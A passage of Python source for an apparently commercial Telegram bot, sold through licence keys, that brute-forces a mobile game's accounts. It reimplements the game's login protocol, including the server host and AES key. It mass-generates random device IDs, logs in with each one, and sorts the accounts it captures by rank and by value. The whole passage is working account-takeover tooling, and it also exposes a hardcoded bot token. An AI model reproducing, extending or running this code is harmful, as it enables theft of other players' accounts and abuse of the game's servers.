import os, sys, time, random, uuid, json, threading, socket, zlib, asyncio
import struct, re, requests, shutil, glob
from queue import Queue
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES

try:
    import zstandard as zstd
except ImportError:
    print("❌ Missing 'zstandard'. Install: pip install zstandard")
    sys.exit(1)

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, ReplyKeyboardRemove, InputFile
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from telegram.constants import ParseMode, ChatAction
import logging

logging.getLogger("telegram").setLevel(logging.CRITICAL)
logging.getLogger("httpx").setLevel(logging.CRITICAL)

# ────────────────────────────────────────────────────────────────
# 1. CONFIGURATION
# ────────────────────────────────────────────────────────────────

TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(BASE_DIR, "PREMIUM_DEVID_SEKER_OUTPUT")
KEYS_FILE = os.path.join(BASE_DIR, "keys.json")
USERS_FILE = os.path.join(BASE_DIR, "authorized_users.json")
BF_LIMITS_FILE = os.path.join(BASE_DIR, "bf_limits.json")
BULK_JOBS_FILE = os.path.join(BASE_DIR, "bulk_jobs.json")

# === EDIT THESE ===
BOT_TOKEN = "8692114721:AAFWynpnoKIza6ym4lv3EBomf4WJTmXJCpo"
ADMIN_IDS = [8477982865]
# ==================

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16
SERVER_HOST = 'login.ml.youngjoygame.com'
SERVER_PORT = 30021
CLIENT_VERSION = '2.1.99.1205.1'
CHANNEL = 'and_usa'
LANGUAGE = 'en'
AVG_BYTES_PER_LINE = 80
MAX_BULK_DEVICES = 100000

HEX_CHARS = "0123456789abcdef"

FOLDERS = {
    "generated": "00_Generated", "split": "00_Split_Devices",
    "login": "01_Login_Success", "detail": "03_Hasil_Detail_8Req",
    "rank_warrior": "04_Rank_Warrior", "rank_elite": "05_Rank_Elite",
    "rank_master": "06_Rank_Master", "rank_gm": "07_Rank_Grandmaster",
    "rank_epic": "08_Rank_Epic", "rank_legend": "09_Rank_Legend",
    "rank_mythic": "10_Rank_Mythic", "v2l_active": "11_V2L_Active",
    "v2l_inactive": "12_V2L_Inactive", "sultan": "13_Sultan",
    "highrank": "14_HighRank", "akun_tua": "15_Akun_Tua",
    "checkpoint": "98_Checkpoints", "error": "99_Error",
    "bruteforce": "00_BruteForce_Logs",
}

def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in FOLDERS.values():
        os.makedirs(os.path.join(OUTPUT_DIR, folder), exist_ok=True)
ensure_dirs()

FILES = {
    "generated_devices": os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt"),
    "login_valid": os.path.join(OUTPUT_DIR, FOLDERS["login"], "login_valid_devices.txt"),
    "all_hits_detail": os.path.join(OUTPUT_DIR, FOLDERS["detail"], "all_hits_detail.txt"),
    "raw_devices_detail": os.path.join(OUTPUT_DIR, FOLDERS["detail"], "raw_devices_detail.txt"),
    "checkpoint_file": os.path.join(OUTPUT_DIR, FOLDERS["checkpoint"], "scan_checkpoints.json"),
    "error_log": os.path.join(OUTPUT_DIR, FOLDERS["error"], "error_log.txt"),
    "bruteforce_log": os.path.join(OUTPUT_DIR, FOLDERS["bruteforce"], "bruteforce_session.txt"),
}

# ────────────────────────────────────────────────────────────────
# 2. KEY ACCESS SYSTEM
# ────────────────────────────────────────────────────────────────

KEYS_LOCK = threading.Lock()
USERS_LOCK = threading.Lock()
BF_LIMITS_LOCK = threading.Lock()
BULK_JOBS_LOCK = threading.Lock()

def load_json(filepath):
    if not os.path.exists(filepath):
        return {}
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_json(filepath, data):
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def generate_key_code():
    parts = []
    for _ in range(4):
        parts.append(''.join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=4)))
    return "ZDSK-" + "-".join(parts)

def create_key(duration_days: int, max_uses: int = 1, created_by: str = "admin") -> dict:
    with KEYS_LOCK:
        keys_db = load_json(KEYS_FILE)
        key_code = generate_key_code()
        while key_code in keys_db:
            key_code = generate_key_code()
        
        now = datetime.now(TZ_WIB)
        expires_at = None if duration_days == 0 else (now + timedelta(days=duration_days)).isoformat()
        
        key_data = {
            "key": key_code,
            "duration_days": duration_days,
            "max_uses": max_uses,
            "uses": 0,
            "created_at": now.isoformat(),
            "created_by": created_by,
            "expires_at": expires_at,
            "activated_by": [],
            "status": "active",
            "note": ""
        }
        keys_db[key_code] = key_data
        save_json(KEYS_FILE, keys_db)
        return key_data

def is_key_valid(key_code: str) -> Tuple[bool, str]:
    with KEYS_LOCK:
        keys_db = load_json(KEYS_FILE)
        if key_code not in keys_db:
            return False, "❌ Key not found in database."
        
        key = keys_db[key_code]
        if key["status"] != "active":
            return False, f"❌ Key status: {key['status']}"
        
        if key["uses"] >= key["max_uses"]:
            return False, "❌ Key has reached maximum uses."
        
        if key["expires_at"]:
            exp = datetime.fromisoformat(key["expires_at"])
            if datetime.now(TZ_WIB) > exp:
                key["status"] = "expired"
                save_json(KEYS_FILE, keys_db)
                return False, "❌ Key has expired."
        
        return True, "✅ Key is valid."

def redeem_key(key_code: str, user_id: int, username: str) -> Tuple[bool, str]:
    key_code = key_code.strip().upper()
    valid, msg = is_key_valid(key_code)
    if not valid:
        return False, msg
    
    with KEYS_LOCK:
        keys_db = load_json(KEYS_FILE)
        key = keys_db[key_code]
        
        if user_id in [u["user_id"] for u in key["activated_by"]]:
            return False, "❌ You already redeemed this key."
        
        now = datetime.now(TZ_WIB)
        if key["duration_days"] == 0:
            user_expires = None
        else:
            user_expires = (now + timedelta(days=key["duration_days"])).isoformat()
        
        key["uses"] += 1
        key["activated_by"].append({
            "user_id": user_id,
            "username": username,
            "activated_at": now.isoformat()
        })
        if key["uses"] >= key["max_uses"]:
            key["status"] = "used"
        save_json(KEYS_FILE, keys_db)
    
    with USERS_LOCK:
        users_db = load_json(USERS_FILE)
        users_db[str(user_id)] = {
            "user_id": user_id,
            "username": username,
            "key": key_code,
            "activated_at": now.isoformat(),
            "expires_at": user_expires,
            "duration_days": key["duration_days"],
            "status": "active"
        }
        save_json(USERS_FILE, users_db)
    
    return True, "✅ Key redeemed successfully!"

def is_user_authorized(user_id: int) -> Tuple[bool, dict]:
    if user_id in ADMIN_IDS:
        return True, {"username": "Admin", "status": "admin", "expires_at": None}
    
    with USERS_LOCK:
        users_db = load_json(USERS_FILE)
        user = users_db.get(str(user_id))
        if not user:
            return False, {}
        
        if user.get("status") != "active":
            return False, user
        
        if user.get("expires_at"):
            exp = datetime.fromisoformat(user["expires_at"])
            if datetime.now(TZ_WIB) > exp:
                user["status"] = "expired"
                users_db[str(user_id)] = user
                save_json(USERS_FILE, users_db)
                return False, user
        
        return True, user

def get_user_expiry_info(user_id: int) -> str:
    valid, user = is_user_authorized(user_id)
    if user_id in ADMIN_IDS:
        return "♾️ Lifetime (Admin)"
    if not user:
        return "❌ Not authorized"
    
    activated = user.get("activated_at", "N/A")
    expires = user.get("expires_at")
    
    if expires:
        exp_dt = datetime.fromisoformat(expires)
        now = datetime.now(TZ_WIB)
        remaining = exp_dt - now
        days_left = remaining.days
        hours_left = remaining.seconds // 3600
        if days_left > 0:
            remaining_str = f"{days_left}d {hours_left}h"
        elif hours_left > 0:
            remaining_str = f"{hours_left}h"
        else:
            remaining_str = f"{remaining.seconds // 60}m"
        
        return (f"🔑 Key: `{user.get('key', 'N/A')}`\n"
                f"📅 Activated: {activated[:19]}\n"
                f"⏰ Expires: {expires[:19]}\n"
                f"⏳ Remaining: {remaining_str}")
    else:
        return f"🔑 Key: `{user.get('key', 'N/A')}`\n♾️ Lifetime access"

def revoke_user_access(user_id: int) -> bool:
    with USERS_LOCK:
        users_db = load_json(USERS_FILE)
        if str(user_id) in users_db:
            users_db[str(user_id)]["status"] = "revoked"
            save_json(USERS_FILE, users_db)
            return True
    return False

def delete_key(key_code: str) -> bool:
    with KEYS_LOCK:
        keys_db = load_json(KEYS_FILE)
        if key_code in keys_db:
            del keys_db[key_code]
            save_json(KEYS_FILE, keys_db)
            return True
    return False

def list_all_keys() -> list:
    with KEYS_LOCK:
        return list(load_json(KEYS_FILE).values())

def list_all_users() -> list:
    with USERS_LOCK:
        return list(load_json(USERS_FILE).values())

# ────────────────────────────────────────────────────────────────
# 2.5 BRUTE FORCE LIMITS SYSTEM
# ────────────────────────────────────────────────────────────────

def get_bf_limit(user_id: Optional[int] = None) -> int:
    with BF_LIMITS_LOCK:
        limits = load_json(BF_LIMITS_FILE)
        if user_id is not None:
            user_overrides = limits.get("user_overrides", {})
            if str(user_id) in user_overrides:
                return user_overrides[str(user_id)]
        return limits.get("device_limit", 1)

def set_bf_limit(limit: int) -> bool:
    if limit < 0:
        return False
    with BF_LIMITS_LOCK:
        limits = load_json(BF_LIMITS_FILE)
        limits["device_limit"] = limit
        save_json(BF_LIMITS_FILE, limits)
        return True

def set_user_bf_limit(user_id: int, limit: int) -> bool:
    if limit < -1:
        return False
    with BF_LIMITS_LOCK:
        limits = load_json(BF_LIMITS_FILE)
        if "user_overrides" not in limits:
            limits["user_overrides"] = {}
        if limit == -1:
            if str(user_id) in limits["user_overrides"]:
                del limits["user_overrides"][str(user_id)]
        else:
            limits["user_overrides"][str(user_id)] = limit
        save_json(BF_LIMITS_FILE, limits)
        return True

def get_user_bf_devices(user_id: int) -> List[str]:
    with BF_LIMITS_LOCK:
        limits = load_json(BF_LIMITS_FILE)
        user_data = limits.get("users", {})
        return user_data.get(str(user_id), [])

def add_user_bf_device(user_id: int, device_id: str) -> bool:
    with BF_LIMITS_LOCK:
        limits = load_json(BF_LIMITS_FILE)
        if "users" not in limits:
            limits["users"] = {}
        if str(user_id) not in limits["users"]:
            limits["users"][str(user_id)] = []
        if device_id not in limits["users"][str(user_id)]:
            limits["users"][str(user_id)].append(device_id)
            save_json(BF_LIMITS_FILE, limits)
            return True
        return False

def clear_user_bf_devices(user_id: int) -> bool:
    with BF_LIMITS_LOCK:
        limits = load_json(BF_LIMITS_FILE)
        if "users" in limits and str(user_id) in limits["users"]:
            limits["users"][str(user_id)] = []
            save_json(BF_LIMITS_FILE, limits)
            return True
        return False

def reset_all_bf_devices() -> bool:
    with BF_LIMITS_LOCK:
        limits = load_json(BF_LIMITS_FILE)
        limits["users"] = {}
        save_json(BF_LIMITS_FILE, limits)
        return True

def get_user_bf_usage_stats(user_id: int) -> Tuple[int, int]:
    devices = get_user_bf_devices(user_id)
    limit = get_bf_limit(user_id)
    return len(devices), limit

def refund_user_bf_device(user_id: int, device_id: str) -> bool:
    """Remove a device from user's used list (refund the usage)."""
    with BF_LIMITS_LOCK:
        limits = load_json(BF_LIMITS_FILE)
        if "users" not in limits:
            return False
        uid = str(user_id)
        if uid not in limits["users"]:
            return False
        if device_id in limits["users"][uid]:
            limits["users"][uid].remove(device_id)
            save_json(BF_LIMITS_FILE, limits)
            return True
        return False

# ────────────────────────────────────────────────────────────────
# 2.6 BULK JOB SYSTEM
# ────────────────────────────────────────────────────────────────

def create_bulk_job(user_id: int, total: int, session_id: str) -> dict:
    with BULK_JOBS_LOCK:
        jobs = load_json(BULK_JOBS_FILE)
        job = {
            "job_id": session_id,
            "user_id": user_id,
            "total": total,
            "processed": 0,
            "hits": 0,
            "failed": 0,
            "status": "running",
            "started_at": datetime.now(TZ_WIB).isoformat(),
            "completed_at": None
        }
        jobs[session_id] = job
        save_json(BULK_JOBS_FILE, jobs)
        return job

def update_bulk_job(session_id: str, **kwargs):
    with BULK_JOBS_LOCK:
        jobs = load_json(BULK_JOBS_FILE)
        if session_id in jobs:
            jobs[session_id].update(kwargs)
            save_json(BULK_JOBS_FILE, jobs)

def get_bulk_job(session_id: str) -> Optional[dict]:
    with BULK_JOBS_LOCK:
        jobs = load_json(BULK_JOBS_FILE)
        return jobs.get(session_id)

def get_user_active_jobs(user_id: int) -> List[dict]:
    with BULK_JOBS_LOCK:
        jobs = load_json(BULK_JOBS_FILE)
        return [j for j in jobs.values() if j.get("user_id") == user_id and j.get("status") == "running"]

def cancel_bulk_job(session_id: str) -> bool:
    with BULK_JOBS_LOCK:
        jobs = load_json(BULK_JOBS_FILE)
        if session_id in jobs and jobs[session_id]["status"] == "running":
            jobs[session_id]["status"] = "cancelled"
            jobs[session_id]["completed_at"] = datetime.now(TZ_WIB).isoformat()
            save_json(BULK_JOBS_FILE, jobs)
            return True
    return False

# ────────────────────────────────────────────────────────────────
# 3. SDP PROTOCOL
# ────────────────────────────────────────────────────────────────

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack()
        elif data is not None:
            self.update(data)
            self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()):
            self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[k] = v

    def _write_varint(self, n: int) -> bytes:
        res = bytearray()
        while n >= 0x80:
            res.append((n & 0x7F) | 0x80)
            n >>= 7
        res.append(n & 0x7F)
        return bytes(res)

    def _read_varint(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, dtype: SdpDataType):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15]) + self._write_varint(tag)

    def _pack_item(self, tag: int, val: Any):
        if isinstance(val, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if val else 0)
        elif isinstance(val, int):
            if val < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-val)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(val)
        elif isinstance(val, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._write_varint(len(enc)) + enc
        elif isinstance(val, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_varint(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_varint(len(val))
                for k, v in sorted(val.items()):
                    self._pack_item(0, k)
                    self._pack_item(0, v)
        else:
            raise Exception("Unsupported type")

    def _unpack_item(self) -> Tuple[int, Any]:
        if self.offset >= len(self.data): return 0, None
        hdr = self.data[self.offset]
        tag = hdr & 0xF
        dtype = SdpDataType(hdr >> 4)
        self.offset += 1
        if tag == 15: tag = self._read_varint()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._read_varint()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_varint()
        if dtype == SdpDataType.FLOAT: return tag, struct.unpack("<f", self._read_varint().to_bytes(4, 'little'))[0]
        if dtype == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._read_varint().to_bytes(8, 'little'))[0]
        if dtype == SdpDataType.STRING:
            l = self._read_varint()
            raw = self.data[self.offset:self.offset + l]
            self.offset += l
            try: return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l = self._read_varint()
            res = [self._unpack_item()[1] for _ in range(l)]
            return tag, res
        if dtype == SdpDataType.DICT:
            l = self._read_varint()
            res = {}
            for _ in range(l):
                _, k = self._unpack_item()
                _, v = self._unpack_item()
                res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

# ────────────────────────────────────────────────────────────────
# 4. CONNECTION & GAME PROTOCOL
# ────────────────────────────────────────────────────────────────

class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue = b''

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(3)
        self.socket.connect((self.host, self.port))

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1
            self.socket = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.cleanup()

    def send_data(self, pid: int, sdp: SdpStruct):
        pkt = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + comp)
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            data = self.queue[4:size]
            self.queue = self.queue[size:]
            if ctype == 1: data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3: data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data)
            pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None

class GameLogin(BaseConnection):
    __slots__ = ['device_id', 'imei', 'android', 'adid']
    
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""

    def run(self) -> Tuple[Optional[int], Optional[int], str]:
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
            }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                return res.get(0), (res[2][0] if 2 in res else None), "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except Exception as e:
            return None, None, f"ERROR ({e})"
        finally:
            self.cleanup()

class GameConnection(BaseConnection):
    __slots__ = ['device_id', 'imei', 'android', 'adid', 'account_id', 'session_key', 
                 'zone_id', 'game_host', 'game_port', 'creation_ts', 'ban_status']
    
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_host = ''
        self.game_port = 0
        self.creation_ts = 0
        self.ban_status = "NORMAL"

    def login_to_login_server(self) -> bool:
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
            2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            self.zone_id = res[2][0]
            self.creation_ts = res.get(19, 0)
            self.ban_status = "NORMAL"
            return True
        if res and isinstance(res, dict):
            for v in res.values():
                if isinstance(v, str) and any(b in v.lower() for b in ('ban', 'suspend', 'freeze', 'limit')):
                    self.ban_status = f"BANNED: {v}"
                    return False
        self.ban_status = f"LOGIN FAILED (PID: {pid})"
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION, 5: self.zone_id, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            host, port = res[1].split(':')
            self.game_host = host
            self.game_port = int(port)
            return True
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host, self.port = self.game_host, self.game_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id, 4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id
        }))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid == 10002: return True
            if pid in (-1, None): break
        return False

    def check_ban_status(self) -> str:
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(2):
            pid, res = self.recv_data()
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                binfo = res[0]
                reason = binfo.get('ban_reason', 'Unknown')
                d, h, m, s = binfo.get('endtime_day', '0'), binfo.get('endtime_hour', '0'), binfo.get('endtime_min', '0'), binfo.get('endtime_sec', '0')
                self.ban_status = f"BANNED (Reason: {reason} | Remaining: {d}d {h}h {m}m {s}s)"
                return self.ban_status
            if pid in (-1, None, 20002): break
        return self.ban_status

    def lookup_player(self, search_value: int):
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        for _ in range(5):
            pid, res = self.recv_data()
            if pid in (-1, None): return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 2: return None
        return None

    def get_role_info(self, role_id: int, zone_id: int):
        self.send_data(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10129: return res
        return None

    def get_skin_role_info(self, role_id: int, zone_id: int):
        self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10144: return res
        return None

# ────────────────────────────────────────────────────────────────
# 5. RANK MAPPING & V2L
# ────────────────────────────────────────────────────────────────

def map_rank(p) -> str:
    if not p or not isinstance(p, (int, float)) or p <= 0:
        return "Unranked"
    p = int(p)
    if p >= 136:
        stars = p - 136
        if stars >= 100: return f"Mythical Immortal ({stars}★)"
        if stars >= 50: return f"Mythical Glory ({stars}★)"
        if stars >= 25: return f"Mythical Honor ({stars}★)"
        return f"Mythic ({stars}★)"
    ranks = [
        (105, "Legend", 5, ["V","IV","III","II","I"]),
        (75, "Epic", 5, ["V","IV","III","II","I"]),
        (45, "Grandmaster", 5, ["V","IV","III","II","I"]),
        (25, "Master", 4, ["IV","III","II","I"]),
        (10, "Elite", 3, ["IV","III","II","I"]),
        (1, "Warrior", 3, ["III","II","I"]),
    ]
    for threshold, name, div_stars, div_names in ranks:
        if p >= threshold:
            offset = p - threshold
            div_idx = min(len(div_names)-1, offset // div_stars)
            star = (offset % div_stars) + 1
            return f"{name} {div_names[div_idx]} ({star}★)"
    return "Warrior III (1★)"

def get_rank_category(rank_text: str) -> str:
    rt = rank_text.lower()
    if "warrior" in rt: return "warrior"
    if "elite" in rt: return "elite"
    if "grandmaster" in rt: return "gm"
    if "master" in rt and "grand" not in rt: return "master"
    if "epic" in rt: return "epic"
    if "legend" in rt: return "legend"
    if "mythic" in rt or "immortal" in rt or "glory" in rt or "honor" in rt:
        return "mythic"
    return "other"

def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
    try:
        conn.send_data(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(2):
            pid, res = conn.recv_data()
            if pid in (-1, None): break
            if pid == 10208 and res:
                data = dict(res)
                for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                    val = data.get(tag)
                    if val is not None:
                        if isinstance(val, (int, float)):
                            return "Enabled" if int(val) > 0 else "Disabled"
                        if isinstance(val, str):
                            if val.lower() in ("1", "true", "enabled", "yes"):
                                return "Enabled"
                            if val.lower() in ("0", "false", "disabled", "no"):
                                return "Disabled"
    except Exception:
        pass
    return "N/A"

# ────────────────────────────────────────────────────────────────
# 6. DEVICE GENERATOR
# ────────────────────────────────────────────────────────────────

REAL_OEM_HASHES = [
    "cd9e459ea708a948d5c2f5a6ca8838cf", "b7f9a1c2d3e4f5061728394a5b6c7d8e",
    "a1c8f304e792b516d8e0349acb1527fe", "f29c4815a73b06de1928475bc0d1e2f3",
    "e50b12789f4ca3612d8e057cb4a193fe", "d41d8cd98f00b204e9800998ecf8427e",
]

def random_hex(n: int) -> str:
    return ''.join(random.choices(HEX_CHARS, k=n))

GEN_FUNCS = {
    "and_standard_full": lambda c: f"and_{random_hex(32)}{random_hex(16)}{uuid.uuid4()}\n",
    "oem_full": lambda c: f"and_{random.choice(REAL_OEM_HASHES)}{random_hex(16)}{uuid.uuid4()}\n",
    "oem_uuid": lambda c: f"and_{random.choice(REAL_OEM_HASHES)}-{uuid.uuid4()}\n",
    "and_md5_uuid": lambda c: f"and_{random_hex(32)}-{uuid.uuid4()}\n",
    "ios_standard": lambda c: f"ios_{str(uuid.uuid4()).upper()}\n",
}

REALISTIC_GENERATORS = [
    GEN_FUNCS["and_standard_full"], GEN_FUNCS["oem_full"],
    GEN_FUNCS["oem_uuid"], GEN_FUNCS["and_md5_uuid"],
    GEN_FUNCS["ios_standard"]
]

def generate_worker(cycle_start, count, gen_idx_start, queue, generators):
    fmt_count = len(generators)
    cycle = cycle_start
    idx = gen_idx_start
    for _ in range(count):
        idx = (idx + 1) % fmt_count
        queue.put(generators[idx](cycle))
        cycle += 1

def writer_thread(queue, output_file):
    buffer = []
    buffer_size = 0
    with open(output_file, "a", encoding="utf-8", buffering=8*1024*1024) as f:
        while True:
            item = queue.get()
            if item is None: break
            buffer.append(item)
            buffer_size += len(item)
            if buffer_size >= 8*1024*1024:
                f.write(''.join(buffer))
                buffer.clear()
                buffer_size = 0
        if buffer:
            f.write(''.join(buffer))

def run_generator(size_mb: float, threads: int = 16):
    generators = REALISTIC_GENERATORS
    target_lines = int((size_mb * 1024 * 1024) / AVG_BYTES_PER_LINE * 1.02)
    output_file = FILES["generated_devices"]
    if os.path.exists(output_file): os.remove(output_file)
    queue = Queue(maxsize=100000)
    writer = threading.Thread(target=writer_thread, args=(queue, output_file))
    writer.start()
    executor = ThreadPoolExecutor(max_workers=threads)
    tasks = []
    chunk_size = 50000
    fmt_count = len(generators)
    lines_left = target_lines
    cycle, idx = 1, 0
    while lines_left > 0:
        take = min(chunk_size, lines_left)
        tasks.append(executor.submit(generate_worker, cycle, take, idx, queue, generators))
        idx += take
        cycle += idx // fmt_count
        idx %= fmt_count
        lines_left -= take
    for future in tasks:
        future.result()
    queue.put(None)
    writer.join()
    executor.shutdown()
    return target_lines, output_file

# ────────────────────────────────────────────────────────────────
# 7. SAVE ENGINE
# ────────────────────────────────────────────────────────────────

HIT_COUNTERS = {
    'sultan': 0, 'highrank': 0, 'v2l_active': 0, 'v2l_inactive': 0,
    'akun_tua': 0, 'banned': 0,
    'warrior': 0, 'elite': 0, 'master': 0, 'gm': 0, 'epic': 0, 'legend': 0, 'mythic': 0
}
COUNTER_LOCK = threading.Lock()
save_lock = threading.Lock()

active_bf_sessions = {}
bf_sessions_lock = threading.Lock()

def get_rank_file(rank_category: str) -> str:
    rank_files = {
        "warrior": os.path.join(OUTPUT_DIR, FOLDERS["rank_warrior"], "warrior_hits.txt"),
        "elite": os.path.join(OUTPUT_DIR, FOLDERS["rank_elite"], "elite_hits.txt"),
        "master": os.path.join(OUTPUT_DIR, FOLDERS["rank_master"], "master_hits.txt"),
        "gm": os.path.join(OUTPUT_DIR, FOLDERS["rank_gm"], "grandmaster_hits.txt"),
        "epic": os.path.join(OUTPUT_DIR, FOLDERS["rank_epic"], "epic_hits.txt"),
        "legend": os.path.join(OUTPUT_DIR, FOLDERS["rank_legend"], "legend_hits.txt"),
        "mythic": os.path.join(OUTPUT_DIR, FOLDERS["rank_mythic"], "mythic_hits.txt"),
    }
    return rank_files.get(rank_category)

def is_already_saved(device_id: str, filepath: str) -> bool:
